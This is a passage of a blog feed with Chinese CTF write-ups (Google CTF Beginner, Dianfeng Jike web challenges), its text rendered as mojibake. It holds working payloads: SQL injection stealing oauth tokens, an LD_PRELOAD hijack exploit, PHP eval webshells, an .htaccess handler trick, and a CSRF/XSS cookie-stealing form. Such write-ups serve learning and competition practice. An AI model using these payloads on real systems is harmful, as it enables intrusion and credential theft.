æˆSQLæ³¨å…¥ã€‚</p><p><code>xxxx&#39; union select 1,oauth_token from oauth_tokens --</code></p><p>è¿™é‡Œé¡ºå¸¦ä¸€æä¸èƒ½ä½¿ç”¨#æ³¨é‡Šç¬¦ï¼Œå› ä¸º#ç¬¦å·åœ¨pythonä¸­ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ä¼šç ´åè¯­æ³•ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/18.png"><h2 id="Filter-env-PWN"><a href="#Filter-env-PWN" class="headerlink" title="Filter env(PWN)"></a>Filter env(PWN)</h2><p>ç»™äº†Cçš„æºä»£ç ï¼Œä¸»è¦æ“ä½œå°±æ˜¯è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œä»£ç ä¸­è¿‡æ»¤äº†ä¸€äº›å¸¸è§çš„ç¯å¢ƒå˜é‡ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/19.png"><p>é—®é¢˜å‡ºåœ¨è¿™ä¸ªè¿‡æ»¤åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡å¤è®¾ç½®ç¯å¢ƒå˜é‡å°±å¯ä»¥äº†ã€‚è¿™é‡Œæ˜¯åˆ©ç”¨LD_PRELOADåŠ«æŒå‡½æ•°ï¼Œæ‰§è¡Œæˆ‘ä»¬ç¼–è¯‘çš„å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __libc_start_main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg[] = &#123;<span class="string">"/bin/cat"</span>, <span class="string">"/home/adminimum/flag"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(arg[<span class="number">0</span>], arg, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc load.c -o load -shared -fPIC</code>ç”ŸæˆåŠ¨æ€é“¾æ¥æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">load_file = base64.b64encode(open(<span class="string">"load"</span>, <span class="string">"rb"</span>).read())</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"env.ctfcompetition.com"</span>, <span class="number">1337</span>)</span><br><span class="line">r.send(<span class="string">"cd /tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"echo '"</span> + load_file + <span class="string">"' &gt; load.txt\n"</span>)</span><br><span class="line">r.send(<span class="string">"base64 -d load.txt &gt; load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"/home/adminimum/filterenv\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp\n"</span>)</span><br><span class="line">r.send(<span class="string">"LD_PRELOAD=/tmp/load.so\n"</span>)</span><br><span class="line">r.send(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><img src="/2018/08/15/google-ctf-beginner-part2/20.png"><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å­¦åˆ°äº†ä¸€äº›PWNæ–¹é¢çš„çŸ¥è¯†è¿˜æ˜¯ä¸é”™çš„ï¼Œä¸°å¯ŒçŸ¥è¯†é¢ã€‚å°±æ˜¯æƒ³åæ§½è¿™ä¸ªé¢˜ç›®çš„æ ‡ç­¾ï¼Œå¾ˆå¤šéƒ½æ˜¯æŒ‚ç¾Šå¤´å–ç‹—è‚‰ã€‚</p><img src="/2018/08/15/google-ctf-beginner-part2/21.png">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Holey-Beep-PWN&quot;&gt;&lt;a href=&quot;#Holey-Beep-PWN&quot; class=&quot;headerlink&quot; title=&quot;Holey Beep(PWN)&quot;&gt;&lt;/a&gt;Holey Beep(PWN)&lt;/h2&gt;&lt;p&gt;Holey Beepæ˜¯CVE-2018-
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>å·…å³°æå®¢CTF éƒ¨åˆ†Webå¤ç°</title>
    <link href="https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/"/>
    <id>https://hurricane618.me/2018/08/01/dianfengjikeCTF-web/</id>
    <published>2018-08-01T05:17:19.000Z</published>
    <updated>2018-08-01T05:23:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¤ç°äº†ä¸‰é“é¢˜ï¼Œå…¶ä»–çš„éƒ½å…³ç¯å¢ƒäº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°çš„è¿™ä¸‰é“å§ã€‚</p><h2 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h2><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°çš„onethinkçš„æ¼æ´åˆ†ææ–‡ç« </p><p><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-4918-1-1.html</a></p><p>è¿™ä¸ªæ˜¯åŸç†ç›¸åŒçš„ï¼Œåªä¸è¿‡æ˜¯thinkphp</p><p><a href="https://xz.aliyun.com/t/99" target="_blank" rel="noopener">https://xz.aliyun.com/t/99</a></p><p>é€šè¿‡è¿™äº›æˆ‘ä»¬çŸ¥é“ï¼Œé—®é¢˜æ˜¯å‡ºåœ¨ç¼“å­˜çš„å­˜å‚¨ä¸Šï¼Œæˆ‘ä»¬çš„ç”¨æˆ·åè¢«ç®€å•çš„ååºåˆ—åŒ–å­˜å‚¨è¿›äº†ç¼“å­˜æ–‡ä»¶ä¸­ã€‚æ‰€ä»¥è¦getshellçš„è¯æˆ‘ä»¬åªéœ€è¦é€šè¿‡ç”¨æˆ·åä¼ å…¥webshellã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªæ¡ä»¶ï¼Œæˆ‘ä»¬å¿…é¡»èƒ½çŒœåˆ°ç¼“å­˜æ–‡ä»¶çš„åå­—ã€‚</p><p>åœ¨é¢˜ç›®çš„æ ¹ç›®å½•ä¸‹æ‰«åˆ° www.zip å¾—åˆ°é¢˜ç›®çš„æºç ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°filenameçš„å‘½åè§„å¾‹ï¼Œä»¥åŠç›®å½•ã€‚æ¨æµ‹è¿™é‡Œçš„æºç å’Œçº¿ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æ¡ä»¶æ»¡è¶³ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/1.png"><p>æˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•çš„æ—¶å€™ï¼Œåˆ é™¤ Application/Install/Data/install.lock æ–‡ä»¶ï¼Œç„¶åé€šè¿‡install.phpå®‰è£…ï¼Œéšåé€šè¿‡åœ¨æœ¬åœ°ç”Ÿæˆç¼“å­˜æ–‡ä»¶æ¥é¢„æµ‹é¢˜ç›®çš„ç¼“å­˜æ–‡ä»¶ï¼Œæœ€åä»£ç æ‰§è¡Œæ‹¿flagã€‚</p><p>ç”±äºç”¨æˆ·åæœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥åˆ†ä¸¤æ¬¡æ³¨å†Œã€‚ç¬¬ä¸€æ¬¡<code>%0a%0d$x=$_GET[x];\\</code>ï¼Œç¬¬äºŒæ¬¡<code>%0a%0deval($x);\\</code></p><p>æ³¨å†Œä¹‹åå¿…é¡»è¦ç™»å½•ä¸€ä¸‹ï¼Œè¿™æ ·å°±æŠŠwebshellå†™å…¥äº†ç¼“å­˜æ–‡ä»¶ä¸­äº†ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/2.png"><p>ä¹‹ååœ¨é¢˜ç›®ä¸­é‡å¤æ­¥éª¤ï¼Œå°±å¯ä»¥æ‹¿åˆ°webshellï¼Œæ‰§è¡Œä»£ç æœç´¢flag</p><img src="/2018/08/01/dianfengjikeCTF-web/3.png"><h2 id="Baby-Web"><a href="#Baby-Web" class="headerlink" title="Baby Web"></a>Baby Web</h2><p>è¿™é“é¢˜ä¸€å¼€å§‹æƒ³æ³•æ˜¯é€šè¿‡æ”¶é›†ä¿¡æ¯ç¤¾å·¥å¾—åˆ°flagâ€¦â€¦ï¼Œå…ˆæ˜¯çœ‹åˆ°<a href="mailto:BabyWeb@my.lol" target="_blank" rel="noopener">BabyWeb@my.lol</a>ï¼Œç„¶åè®¿é—®my.lolå¯ä»¥å¾—åˆ°ä¸€ä¸ªqqé‚®ç®±ï¼Œç»“æœè¿™ä¸ªqqæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ€è·¯å°±æ–­åœ¨è¿™é‡Œäº†ã€‚</p><p>å‚è€ƒäº†å…¶ä»–äººçš„writeupï¼Œå‘ç°è¦é€šè¿‡è¿™äº›ä¿¡æ¯çŒœæµ‹åå°ï¼Œçˆ†ç ´å¯†ç â€¦â€¦åƒè¿™ç§ä¿¡æ¯é‡è¾ƒå°‘çš„é¢˜ç›®ï¼Œéƒ½ä¼šæœ‰ä¸€äº›æ‰«ç›®å½•ï¼Œæ‰«ç«¯å£ï¼Œæ”¶é›†å­åŸŸåä¹‹ç±»çš„æ“ä½œã€‚</p><p>è¾“å…¥<a href="http://106.75.2.4/babyweb" target="_blank" rel="noopener">http://106.75.2.4/babyweb</a> ï¼Œè‡ªåŠ¨è·³è½¬åˆ°<a href="http://106.75.2.4/babyweb/login.php" target="_blank" rel="noopener">http://106.75.2.4/babyweb/login.php</a> ï¼Œçœ‹äº†ä¸€ä¸ªwriteupæœ‰çš„é˜Ÿä¼èƒ½ç›´æ¥æ ¹æ®æ”¶é›†çš„ä¿¡æ¯çˆ†ç ´å‡ºç”¨æˆ·åå’Œå¯†ç ã€‚ã€‚ã€‚è¿™æ“ä½œå¤ªå¼ºäº†ï¼Œæˆ‘æ˜¯æä¸å‡ºæ¥ï¼Œæ‰€ä»¥å°±æŒ‰ç…§å¸¸è§„æ“ä½œæ‰«ç«¯å£ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/4.png"><p>æ ¹æ®æ‰«å‡ºæ¥çš„ç»“æœå¯ä»¥çœ‹åˆ°å¼€æ”¾äº†3306ç«¯å£ï¼Œä½¿ç”¨hydraçˆ†ç ´ä¹‹ã€‚è¿™ä¸ªæˆ‘åœ¨ä¸€å¼€å§‹çš„æ—¶å€™çˆ†ç ´çš„æ˜¯rootç”¨æˆ·ï¼Œç»“æœçœ‹æç¤ºå·²ç»æ”¹æˆå¦å¤–çš„ç”¨æˆ·äº†â€¦â€¦å“­å”§å”§ï¼Œæœ€åæ˜¯åœ¨writeupçš„å¸®åŠ©ä¸‹çŸ¥é“äº†ç”¨æˆ·åä¸ºbabywebï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡ç½‘ç«™çš„ä¿¡æ¯æ¨æµ‹å‡ºæ¥ã€‚</p><p>æ‹¿åˆ°å¯†ç ä¹‹åï¼Œè¿æ¥æ•°æ®åº“ã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/5.png"><p>ç„¶è€Œå¹¶æ²¡æœ‰æŸwriteupä¸­æ‰€è¯´çš„ç”¨æˆ·åå¯†ç ï¼Œå¯èƒ½è¢«åˆ äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±åªèƒ½ç›´æ¥ç”¨writeupä¸­çš„ç”¨æˆ·åå¯†ç ç™»åå°äº†ã€‚</p><p>åå°æœ‰ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ï¼Œç„¶ååç¼€æœ‰é™åˆ¶åªèƒ½æ˜¯å›¾ç‰‡åç¼€ï¼Œè¿™é‡Œä¸Šä¼ ä¹‹åæ²¡æœ‰è·¯å¾„ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰æ•°æ®åº“çš„æ•°æ®ï¼Œæ ¹æ®æ•°æ®åº“ä¸­çš„æ•°æ®æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸Šä¼ åæ–‡ä»¶çš„æ–‡ä»¶åå†åŠ ä¸Šimgè·¯å¾„å°±å¯ä»¥çŸ¥é“æ–‡ä»¶çš„è·¯å¾„ã€‚å†çœ‹çœ‹ä¸Šä¼ çš„ç±»å‹ä¸­è¿˜æœ‰htaccesssï¼Œè¿™é‡Œå°±æ˜¯æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´åˆ©ç”¨ã€‚</p><p>é€šè¿‡ä¸Šä¼ htaccessæ–‡ä»¶æ¥è®©ä¸€äº›åç¼€å¾—åˆ°è§£æã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;abc&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æœ€åä¸Šä¼ .abcä¸ºåç¼€çš„webshellå³å¯</p><img src="/2018/08/01/dianfengjikeCTF-web/6.png"><h2 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h2><p>ç½‘ç«™ä½¿ç”¨metinfoæ¨¡æ¿ï¼Œåœ¨ç½‘ä¸Šæœç´¢ä¸€ç•ªï¼Œçœ‹åˆ°äº†å‡ ä¸ªSQlæ³¨å…¥çš„æ´ï¼Œè¯•äº†è¯•éƒ½ä¸è¡Œï¼Œç´¢æ€§æ”¾å¼ƒï¼Œçœ‹writeupã€‚</p><p>æ‰«æç›®å½•æ‰«å‡ºfile/file.phpï¼Œèƒ½åˆ é™¤æ–‡ä»¶ï¼Œç„¶åæ²¡æœ‰å¯¹..è¿‡æ»¤å¯¼è‡´å¯ä»¥è·¨ç›®å½•åˆ é™¤æ–‡ä»¶â€¦â€¦ emmmm çœ‹æ¥æ˜¯ä¸ºäº†æ¯”èµ›é¢å¤–æ·»åŠ äº†ä¸€ä¸ªæ–‡ä»¶åˆ é™¤ï¼Œè¿™ä¸ªå¦‚æœå­—å…¸æ²¡æ‰«å‡ºæ¥å°±æ ¹æœ¬æ— æ³•ä¸‹æ‰‹äº†ã€‚</p><p>åˆ é™¤æ–‡ä»¶çš„è·¯å¾„ä¸­æœ‰å¯¹<code>./</code>çš„è¿‡æ»¤ï¼Œæ‰€ä»¥æœ€ååˆ é™¤çš„è·¯å¾„ä¸º<code>...//xxxx/xxx</code><br>æ‰«åˆ°è¿™ä¸ªä¹‹åï¼Œåœ¨ä¹‹å‰çš„metinfoæ¼æ´é‡Œé¢æœ‰è®²åˆ é™¤install.lockæ–‡ä»¶ï¼Œå¯¼è‡´é‡è£…çš„é—®é¢˜ï¼Œå†åŠ ä¸Šmetinfoå¯¹æ•°æ®åº“å‚æ•°è¿‡æ»¤ä¸ä¸¥çš„é—®é¢˜ï¼Œåªè¦æ•°æ®åº“é…ç½®å‚æ•°ä¸­ä»»æ„ä¸€é¡¹å¡«å…¥ä¸€å¥è¯æœ¨é©¬<code>#*/@eval($_REQUEST[xxx]);/*</code>ï¼Œå°±å¯ä»¥æˆåŠŸgetshellã€‚</p><img src="/2018/08/01/dianfengjikeCTF-web/7.png"><p>è™½ç„¶å®‰è£…æ­¥éª¤æ²¡æœ‰èµ°å®Œï¼Œä½†æ˜¯åªè¦æ•°æ®åº“åˆ›å»ºæˆåŠŸï¼Œå°±å¯ä»¥é€šè¿‡config/config_db.phpæ‹¿shell</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://url.cn/5HWdbfS" target="_blank" rel="noopener">http://url.cn/5HWdbfS</a></p><p><a href="https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DYnLhYpC2eASyouk1YA2zg</a></p><p><a href="https://xz.aliyun.com/t/2469" target="_blank" rel="noopener">https://xz.aliyun.com/t/2469</a></p><p><a href="https://www.safeinfo.me/ldgb/75.html" target="_blank" rel="noopener">https://www.safeinfo.me/ldgb/75.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å¤ç°äº†ä¸‰é“é¢˜ï¼Œå…¶ä»–çš„éƒ½å…³ç¯å¢ƒäº†ï¼Œè®°å½•ä¸€ä¸‹å¤ç°çš„è¿™ä¸‰é“å§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;A-Simple-CMS&quot;&gt;&lt;a href=&quot;#A-Simple-CMS&quot; class=&quot;headerlink&quot; title=&quot;A Simple CMS&quot;&gt;&lt;/a&gt;A Simple CMS&lt;/
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Google CTF Beginner Part1</title>
    <link href="https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/"/>
    <id>https://hurricane618.me/2018/07/18/google-ctf-beginner-part1/</id>
    <published>2018-07-18T15:03:09.000Z</published>
    <updated>2018-07-19T01:16:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¼šé™†é™†ç»­ç»­çš„æŠŠGoogleCTFé¢˜ç›®çš„ç›¸å…³å¤ç°æ•´ç†å‡ºæ¥ï¼Œè¿™é‡Œå…ˆæ”¾ä¸€éƒ¨åˆ†ã€‚é€šè¿‡è¿™æ¬¡Beginnerè®­ç»ƒè¿˜æ˜¯äº†è§£åˆ°äº†è®¸å¤šä¹‹å‰æ²¡æ¥è§¦è¿‡çš„ï¼Œæ¯”å¦‚PWNé¢˜ä¸­çš„libcåœ°å€é—®é¢˜ã€‚</p><h2 id="LETTER-MISC"><a href="#LETTER-MISC" class="headerlink" title="LETTER(MISC)"></a>LETTER(MISC)</h2><p>åŸç†è¯´å‡ºæ¥éƒ½å¾ˆç®€å•ï¼Œè€ƒå¯Ÿçš„æ˜¯PDFä¸­è¡¨å±‚çš„è¦†ç›–å…¶å®è¿˜æ˜¯å¯è¯»çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é€‰ä¸­éœ€è¦çš„å†…å®¹å¤åˆ¶ç²˜è´´å‡ºæ¥å°±å¯ä»¥äº†</p><img src="/2018/07/18/google-ctf-beginner-part1/1.png"><p>å¤åˆ¶ç²˜è´´å¤§æ³•</p><img src="/2018/07/18/google-ctf-beginner-part1/2.png"><h2 id="OCR-is-cool-MISC"><a href="#OCR-is-cool-MISC" class="headerlink" title="OCR is cool!(MISC)"></a>OCR is cool!(MISC)</h2><p>ä¸€é“é¢˜è€ƒå¯Ÿå›¾ç‰‡è½¬æ–‡å­—ä¹‹åï¼Œè¿ç”¨å¤å…¸åŠ å¯†è§£å†³é—®é¢˜ã€‚å­¦åˆ°æ–°çš„çŸ¥è¯†OCRï¼ŒPDFæˆ–è€…å›¾ç‰‡è½¬æ–‡æœ¬çš„æŠ€æœ¯ã€‚</p><p><a href="https://www.onlineocr.net/" target="_blank" rel="noopener">åœ¨çº¿è½¬æ¢é“¾æ¥</a></p><img src="/2018/07/18/google-ctf-beginner-part1/3.png"><p>ä¹‹ååœ¨å‡¯æ’’åŠ å¯†ä¸­ç ´è§£ï¼Œå› ä¸ºé¢˜ç›®ä¸­åŒ…å«ç€å‡¯æ’’ï¼Œæç¤ºä¹Ÿæ˜¯å¾ˆæ˜æ˜¾äº†ã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/4.png"><h2 id="MOAR-PWN"><a href="#MOAR-PWN" class="headerlink" title="MOAR(PWN)"></a>MOAR(PWN)</h2><p>è€ƒå¯Ÿäº†ä¸€ä¸ªç»†èŠ‚ç‚¹ï¼Œå½“æˆ‘ä»¬å¤„äºmanæ‰‹å†Œçš„çŠ¶æ€ä¸‹å¯ä»¥ä½¿ç”¨ !command çš„æ–¹å¼æ¥æ‰§è¡Œå‘½ä»¤</p><img src="/2018/07/18/google-ctf-beginner-part1/5.png"><p>æˆ‘ä»¬å°±ç›´æ¥lså‡ºhomeç›®å½•ä¸‹æœ‰ä¸œè¥¿ï¼Œç„¶åcatå‡ºæ¥å³å¯ã€‚</p><h2 id="Floppy-MISC"><a href="#Floppy-MISC" class="headerlink" title="Floppy(MISC)"></a>Floppy(MISC)</h2><p>ç»™äº†ä¸€ä¸ªå›¾æ ‡æ–‡ä»¶ï¼Œçœ‹äº†æ–‡æœ¬å†…å®¹æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åå¼€å§‹ç”¨binwalkåˆ†æä¸€ä¸‹</p><img src="/2018/07/18/google-ctf-beginner-part1/6.png"><p>æœç„¶é‡Œé¢æœ‰ä¸œè¥¿ï¼Œæ”¹æˆzipè§£å‹å‡ºæ¥å°±okäº†</p><img src="/2018/07/18/google-ctf-beginner-part1/7.png"><h2 id="FLOPPY2-MISC"><a href="#FLOPPY2-MISC" class="headerlink" title="FLOPPY2(MISC)"></a>FLOPPY2(MISC)</h2><p>åœ¨ä¸Šä¸€é“é¢˜ç›®ä¸­ç•™ä¸‹äº†ä¸€ä¸ª <code>www.com</code> æ–‡ä»¶ï¼Œcomåç¼€æŸ¥äº†ä¸€ä¸‹æ˜¯MS-DOSçš„æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥ç°åœ¨çš„windowsç³»ç»Ÿæ˜¯æ— æ³•æ‰§è¡Œçš„ï¼ŒDOSBOXå¯åŠ¨ï¼</p><p>ç›´æ¥è¿è¡Œå°±å‡ºç°ä¸€ä¸ªæ¯«æ— æ„ä¹‰çš„è¯ï¼Œæ²¡æœ‰ä»€ä¹ˆç»“æœä¹‹åæŠŠäºŒè¿›åˆ¶æ–‡ä»¶è½¬æˆæ–‡æœ¬çœ‹çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ”¶è·â€¦â€¦</p><p>ç»è¿‡å…¶ä»–äººçš„Writeupä¹‹åå¾—çŸ¥è¦è°ƒè¯•è¿™ä¸ªç¨‹åºï¼Œåœ¨è°ƒè¯•ä¸­å‘ç°ï¼Œå®ƒä¼šå¯¹å…¶ä¸­çš„æŸä¸ªæ®µå–å‡ºå­—ç¬¦å¼‚æˆ–ç„¶åé‡å†™å›å»ï¼Œè¿™æ ·å°±å¥½åŠäº†ï¼Œä¸€ç›´è·Ÿè¸ªè°ƒè¯•ï¼Œæ¯æ¬¡ç»è¿‡ä¸€äº›é‡å†™æ“ä½œä¹‹åçœ‹çœ‹å†…å­˜ä¸­çš„æ•°æ®ã€‚æœ€åå¾—åˆ°flagã€‚</p><img src="/2018/07/18/google-ctf-beginner-part1/8.png"><h2 id="Security-By-Obsecurity-MISC"><a href="#Security-By-Obsecurity-MISC" class="headerlink" title="Security By Obsecurity(MISC)"></a>Security By Obsecurity(MISC)</h2><p>ä¸€é“å¾ˆçŒ¥ççš„é¢˜ç›®â€¦â€¦ é€šè¿‡fileå‘½ä»¤çŸ¥é“å¾—åˆ°çš„æ–‡ä»¶æ˜¯ä¸ªzipå‹ç¼©åŒ…ï¼Œç„¶åå°±å¼€å§‹äº†ï¼Œä¸€ç›´è§£å‹è§£å‹è§£å‹ã€‚ã€‚ã€‚</p><p>æœ€åæ‹¿åˆ°ä¸€ä¸ªpasswordçš„å‹ç¼©åŒ…é‡Œé¢æœ‰ä¸ªpassword.txtéœ€è¦å¯†ç ï¼Œçœ‹ä»–é¢˜ç›®ä¸­æœ‰æç¤ºjohnï¼Œæš—ç¤ºJohn The Ripperï¼Œè¿™ä¸ªæš´åŠ›ç ´è§£å·¥å…·ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å°±æš´åŠ›ä¸€ä¸‹å§ï¼Œæˆ‘è¿™é‡Œç”¨çš„æ˜¯ARCHPR</p><img src="/2018/07/18/google-ctf-beginner-part1/9.png"><p>å¾—åˆ°å¯†ç asdfï¼Œè§£å‹å¾—åˆ°password.txt</p><img src="/2018/07/18/google-ctf-beginner-part1/10.png"><p>æ‹¿åˆ°flag</p><h2 id="Router-UI-Web"><a href="#Router-UI-Web" class="headerlink" title="Router-UI(Web)"></a>Router-UI(Web)</h2><p>æ‰“å¼€ç½‘ç«™æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œè¾“å…¥è´¦å·å’Œå¯†ç ä¹‹åï¼Œå‘ç°ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œæ ¹æ®é¢˜ç›®çš„æç¤ºï¼ŒXSSæ— ç–‘ã€‚æˆ‘ä»¬è¾“å…¥scriptéªŒè¯æ¼æ´ï¼Œç»“æœè¢«chromeçš„auditoræ‹¦æˆªã€‚GGï¼Œè¿™é‡Œimgï¼Œsvgç­‰ç­‰æ ‡ç­¾å¤±å»ä½œç”¨ï¼Œå°±ç®—ç”¨src=javascript:alert(1) è¿™æ ·çš„å½¢å¼ä¹Ÿä¼šå˜æˆ500â€¦â€¦</p><p>æ— å¥ˆä¹‹å‰ï¼Œçœ‹äº†çœ‹åˆ«äººçš„writeupï¼Œå‘ç°å®ƒä»¬æ˜¯åˆ©ç”¨äº†é¡µé¢ä¸­çš„//åˆ†éš”ç¬¦ï¼ŒæŠŠscriptæ‹†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ï¼Œè¿™æ ·å°±ç»•è¿‡äº†auditorçš„æ£€æŸ¥ã€‚</p><p>é‚£ä¹ˆå¯ä»¥å¼•å…¥jsæ‰§è¡Œäº†ï¼Œæ€ä¹ˆå·ç®¡ç†å‘˜çš„cookieå‘¢ï¼Ÿå¿…é¡»è¦è®©ç®¡ç†å‘˜ç”¨è¿™æ ·çš„usernameå’Œpasswordç™»å½•æ‰è¡Œï¼Œæ‰€ä»¥å°±æ˜¯CSRFäº†ã€‚</p><p>ç»™ç®¡ç†å‘˜ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨æäº¤çš„ç½‘ç«™ï¼Œæäº¤è¿™äº›å†…å®¹ï¼Œå°±ä¼šè§¦å‘jsæ‹¿åˆ°cookieã€‚ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"https://router-ui.web.ctfcompetition.com/login?next=https%3A%2F%2Frouter-ui.web.ctfcompetition.com%2F"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=https:"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"xxxxx/img/11.js&gt;&lt;/script&gt;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"b"</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"b"</span>).click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨11.jsä¸­ï¼Œæ”¾å…¥å·cookieçš„è¯­å¥ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> 